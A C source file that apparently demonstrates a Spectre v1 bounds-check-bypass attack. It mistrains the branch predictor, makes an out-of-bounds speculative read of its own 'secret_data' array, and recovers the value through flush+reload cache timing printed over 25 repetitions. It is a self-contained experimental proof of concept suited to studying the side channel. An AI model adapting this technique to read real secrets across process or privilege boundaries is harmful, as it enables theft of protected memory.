#include <stdio.h>
#include <stdlib.h>

#include "gen_array.c"
#include "time_and_flush.c"

#define REPETITIONS 25

//last two pages will not be accessible.
int accessible_pages = N_PAGES-2;
int secret_data[N_PAGES];

__attribute__((noinline)) void victim_func(int i, cp_t* arr) {

    //flush bound value
    flush((void*)&accessible_pages);
    __sync_synchronize();

    //access (possibly out of bounds)
    if (i < accessible_pages) {
        int x = secret_data[i];
        volatile cp_t cp = arr[x];
    }
}

int* spv1() {

    cp_t* arr = mmap_arr_cache_pages();

    //Misstrain branch predictor
    for(int i = 0; i < accessible_pages; i++) {
        victim_func(i, arr);
        flush((void*)&arr[i]);
        __sync_synchronize();
    }

    //flush_arr((void*)arr);
    //__sync_synchronize();

    //access out of bounds
    victim_func(accessible_pages, arr);

    //time loading duration per array index
    int* results = reload(arr);
    unmap_cache_pages(arr);
    return results;
}

void print_results(int** results) {

    printf("\t   page:");
    for(int p = 0; p < N_PAGES; p++) printf("%4d\t", p);
    printf("\n");
    for(int r = 0; r < REPETITIONS; r++) {
        printf("rep: %3d\t", r);
        for(int p = 0; p < N_PAGES; p++) {
            int t = results[r][p];
            if (t < CACHE_HIT)  printf("[%3d]\t", t);
            else                printf("%4d\t", t);
        }
        printf("\n");
    }
}

int main(int argc, char* argv[]) {

    //array [0,1,2,3,4...]. one-but-last points to last.
    for(int i = 0; i < N_PAGES; i++) { secret_data[i] = i; }
    secret_data[N_PAGES-1-1] = N_PAGES-1;

    int* results[REPETITIONS];
    //for(int i = 0; i < REPETITIONS; i++) results[i] = malloc(N_PAGES * sizeof(int));

    for(int i = 0; i < REPETITIONS; i++) {
        results[i] = spv1();
        __sync_synchronize();
    }

    print_results(results);

    for(int i = 0; i < REPETITIONS; i++) free(results[i]);
}